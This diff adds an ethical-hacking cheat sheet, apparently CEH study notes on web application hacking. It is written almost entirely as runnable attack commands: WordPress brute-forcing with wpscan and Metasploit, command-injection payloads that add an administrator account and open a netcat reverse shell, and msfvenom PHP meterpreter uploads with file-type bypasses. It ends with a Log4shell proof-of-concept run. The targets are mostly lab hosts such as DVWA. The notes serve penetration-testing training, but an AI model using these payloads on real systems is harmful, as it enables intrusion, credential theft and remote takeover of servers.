@@ -1,0 +1,148 @@
+
+## Web Application Hacking 14
+    # Footprinting Web Insfrastructure
+	nmap -T4 -A -v www.domain.com 
+	telnet www.domain.com 80
+		(Type GET / HTTP/1.0 and press enter twice)
+	
+
+	whatweb www.domain.com
+	whatweb -v www.domain.com
+
+    # OwaspZAP
+		Automated Scan http://www.domain.com
+			Spider | Active Scan | Alerts
+	
+    # Load Balancers
+		dig yahoo.com
+		lbd yahoo.com
+
+    # Directory Busting
+		nmap -sV --script=http-enum www.domain.com
+
+		gobuster dir -u http://www.domain.com -w common.txt
+		gobuster dir -u http://www.domain.com -w common.txt -x .php,.aspx
+
+		python3 dirsearch.py -u http://www.moviescope.com
+		python3 dirsearch.py -u http://www.moviescope.com -e aspx
+		python3 dirsearch.py -u http://www.moviescope.com -x 403 //exclude 403 status code.
+
+	Vega (Windows)	//vulnerability scanning
+
+    # Clickjacproc
+		echo "http://www.domain.com" > domain.txt
+                python3 clickjackproc.py -f domain.txt
+	or
+		ghosteye (use 6 for clickjacking)
+
+    # Bruteforce attack with Burpsuite
+
+		use intruder to bruteforce (cluster bomb)
+	or
+		wpscan --url http://www.domain.com:8080/CEH -U usernames.txt -P passwords.txt
+
+    # Parameter Tempering 
+		Using Burpsuite
+
+    # PwnXSS
+		python3 pwnxss.py -u http://testphp.vulnweb.com
+
+    # Parameter Tampering and XSS in browser (manual)
+		?id=1, ?id=2, index.php?page_id=3
+
+    # CSRF 
+
+    # WordPress (Enum vulnerable plugin and users)
+	Get Api token from https://wpscan.com/register/ 
+
+		wpscan --api-token "" --url http://<ip>:<port>/CEH --plugin-detection aggressive --enumerate vp
+
+	Wpscan and Metasploit
+
+		wpscan --api-token "" --url http://<ip>:<port>/CEH --enumerate u	(enumerate users)
+
+		msfconsole -q
+			msf6 > search wordpress_login
+			msf6 > use 0
+			msf6 auxiliary(scanner/http/wordpress_login_enum) > set rhosts 10.10.1.22
+			msf6 auxiliary(scanner/http/wordpress_login_enum) > set rport 8080
+			msf6 auxiliary(scanner/http/wordpress_login_enum) > set targeturi http://10.10.1.22:8080/CEH
+			msf6 auxiliary(scanner/http/wordpress_login_enum) > set pass_file passwords.txt
+			msf6 auxiliary(scanner/http/wordpress_login_enum) > set username admin
+			msf6 auxiliary(scanner/http/wordpress_login_enum) > run
+		
+		wpscan --api-token "" --url "" --enumerate p	(enumerate plugins)
+		wpscan --api-token "" --url "" --enumerate t	(enumerate themes)
+		    
+    # Command Injection	
+	Set security to 'low'
+	
+	| ls (low)
+	| ls (medium)
+	|ls  (high)
+
+	| hostname
+	| whoami
+	| tasklist
+	| taskkill /PID 3112 /F
+	| dir C:\
+	| type C:\flag.txt
+
+	| net user
+	| net user Test /Add
+	| net user
+	| net localgroup administrators Test /Add
+	| net user
+	
+	127.0.0.1 && nc -c sh <ip> 4477
+	//net user test active:yes
+
+	(now connect to test user with RDP)
+
+    # File Upload
+	Low
+		msfvenom -p php/meterpreter/reverse_tcp LHOST=<my-ip> LPORT=4477 -f raw > low.php
+	
+	Medium 
+		msfvenom -p php/meterpreter/reverse_tcp LHOST=<my-ip> LPORT=4477 -f raw > medium.php
+		mv medium.php medium.php.jpg
+	
+		Intercept the upload request with burpsuite and change to extension from ".php.jpg" to ".php"
+
+		OR
+
+		simply upload medium.php -> intercept request -> change the header from [Content-Type: application/x-php] to  [Content-Type: image/jpeg]
+
+	High	
+		msfvenom -p php/meterpreter/reverse_tcp LHOST=<my-ip> LPORT=4477 -f raw > image.jpg
+
+		Add "GIF98" \n	in the starting of image.jpg
+		upload on dvwa
+
+		|dir "C:\wamp64\www\DVWA\hackable\uploads"
+		|copy "C:\wamp64\www\DVWA\hackable\uploads\image.jpg" "C:\wamp64\www\DVWA\hackable\uploads\high.php"
+
+		open exploit/multi/handler/ meterpreter and
+		run the file in browser	http://10.10.1.22:8080/dvwa/hackable/uploads/high.php
+
+    # Log4shell
+
+        pip3 install -r requirements.txt
+        replace /jdk.... with the original one with absolute path /home/attacker/jdk...
+        nc -lvnp 7777
+        python3 poc.py --userip <myip> --webport 8080 --lport 7777
+        
+    # Extras:--	
+
+    # Identify CMS (Content Management System)
+	wig <url>
+
+    # WordPress Hacking
+	wordpress
+	
+	wpscan --url http://certifiedhacker.com -U usernames.txt -P passwords.txt
+	wpscan --api-token "" --url http://<ip>:<port>/CEH --plugin-detection aggressive --enumerate vp
+	wpscan --api-token "" --url http://<ip>:<port>/CEH --enumerate u
+	
+
+
